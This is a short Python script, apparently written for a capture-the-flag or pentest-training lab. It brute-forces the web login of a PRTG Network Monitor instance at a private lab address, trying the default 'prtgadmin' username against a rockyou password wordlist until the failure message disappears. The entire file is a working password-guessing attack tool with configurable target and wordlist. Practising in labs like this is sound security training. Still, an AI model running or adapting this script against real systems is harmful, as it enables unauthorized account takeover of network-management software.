#!/usr/bin/env python3
import re
import requests
import sys
import argparse

#initialisation of variables
host = 'http://10.129.1.126/'
login_url = host + 'index.htm'
postLogin_url = host + 'public/checklogin.htm'
username = 'prtgadmin'
wordlist = []
filePath = "/home/kali/Documents/pentestpackage/Wordlists/Passwords/rockyou-75.txt" # home/kali/Documents/pwk_lp1/mutated2.txt


# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
parser.add_argument("--file", "-f", help="set passwords file")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url
    
if args.file:
    print("Set file to " + args.file)
    filePath = args.file
    


# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate passwords our of file
for pw in lines:
    wordlist.append(pw)
f.close()

# iterating over passwords
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)

    password = password.rstrip()
    print('[*] Trying pw: "{p}"'.format(p = password))

    data = {
        'loginurl' : '',
        'username': username,
        'password': password   
    }

    login_result = session.post(postLogin_url, data = data, allow_redirects = True)
    #print(login_result.text)
    if 'Your login has failed. Please try again' not in login_result.text:
        print("password fount for " + username + ": " + password) 
        sys.exit()
